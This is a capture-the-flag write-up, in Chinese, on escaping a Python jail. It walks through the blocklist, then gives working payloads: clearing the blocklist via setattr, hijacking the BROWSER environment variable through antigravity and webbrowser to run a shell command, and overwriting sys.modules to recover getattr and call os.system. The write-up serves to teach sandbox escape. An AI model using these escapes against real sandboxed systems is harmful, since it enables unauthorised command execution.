# Pyjail

```python
blocklist = ['.', '\\', '[', ']', '{', '}',':']
DISABLE_FUNCTIONS = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]
DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}
```

flag设置权限了不能直接读，给了⼀个readflag，执行`/readflag giveflag`即可

本题可以多行执行，清空`blocklist`即可

```sh
welcome!
>>> setattr(__import__('__main__'),'blocklist','')
None
>>> __import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ ls
jail.py readflag.c
$ ls /
bin ctf etc home lib media opt readflag run srv tmp var
boot dev flag kctf lib64 mnt proc root sbin sys usr
$ /readflag giveflag
idek{9eece9b4de9380bc3a41777a8884c185}
```

# Pyjail Revenge

```python
blocklist = ['.', '\\', '[', ']', '{', '}',':', "blocklist", "globals",
"compile"]
```

黑名单多了`globals`、`blacklist`、`compile`

同时只能一行输入，不能多次输入

## antigravity hijack BROWSER env

`import antigravity`会打开一个漫画网页

```python
import webbrowser
import hashlib
webbrowser.open("https://xkcd.com/353/")
```

`webbrowser#open`调用`register_standard_browsers()`

```python
def open(url, new=0, autoraise=True):
    """Display url using the default browser.
    If possible, open url in a location determined by new.
    - 0: the same browser window (the default).
    - 1: a new browser window.
    - 2: a new browser page ("tab").
    If possible, autoraise raises the window (the default) or not.
    """
    if _tryorder is None:
    	with _lock:
    		if _tryorder is None:
   				 register_standard_browsers()
    for name in _tryorder:
    	browser = get(name)
    	if browser.open(url, new, autoraise):
   			return True
    return False
```

继续跟进发现其检查了`os.environ`的`BROWSER`环境变量

```python
if "BROWSER" in os.environ:
    userchoices = os.environ["BROWSER"].split(os.pathsep)
    userchoices.reverse()

    # Treat choices in same way as if passed into get() but do register
    # and prepend to _tryorder
    for cmdline in userchoices:
        if cmdline != '':
            cmd = _synthesize(cmdline, preferred=True)
            if cmd[1] is None:
                register(cmdline, None, GenericBrowser(cmdline), preferred=True)
```

`GenericBrowser`可以运⾏cmdline

```python
class GenericBrowser(BaseBrowser):
    """Class for all browsers started with a command
       and without remote functionality."""

    def __init__(self, name):
        if isinstance(name, str):
            self.name = name
            self.args = ["%s"]
        else:
            # name should be a list with arguments
            self.name = name[0]
            self.args = name[1:]
        self.basename = os.path.basename(self.name)

    def open(self, url, new=0, autoraise=True):
        sys.audit("webbrowser.open", url)
        cmdline = [self.name] + [arg.replace("%s", url)
                                 for arg in self.args]
        try:
            if sys.platform[:3] == 'win':
                p = subprocess.Popen(cmdline)
            else:
                p = subprocess.Popen(cmdline, close_fds=True)
            return not p.wait()
        except OSError:
            return False
```

payload：

```python
__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/
sh -c "/readflag giveflag" #%s')))
```

## recover sys.modules to validate getattr

由于`__import__`在加载时会先找`sys.modules`

可以先通过`setattr`覆盖`sys.modules`为`__builtins__`，这样`__import__`即可调用`getattr`

通过`getattr`来加载`os.system`

```python
setattr(__import__('sys'),'modules',__builtins__) or __import__('getattr')
(__import__('os'),'system')('sh')
```

